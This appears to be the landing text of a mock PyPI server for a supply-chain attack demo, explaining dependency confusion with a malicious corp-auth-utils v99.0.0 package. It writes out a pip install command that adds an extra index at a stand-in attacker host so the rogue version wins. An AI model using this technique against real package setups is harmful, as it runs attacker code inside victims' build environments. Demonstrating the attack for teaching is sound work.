S04 Dependency Confusion Demo — PyPI Server

This server simulates a public PyPI registry hosting a malicious corp-auth-utils v99.0.0 package for the S04 Supply Chain Attack demo.

Dependency Confusion scenario:

pip install corp-auth-utils --index-url http://INTERNAL_REGISTRY:8000/simple/ --extra-index-url http://ATTACKER_IP:9000/simple/

pip will choose v99.0.0 from this server over v1.0.0 from the internal registry.
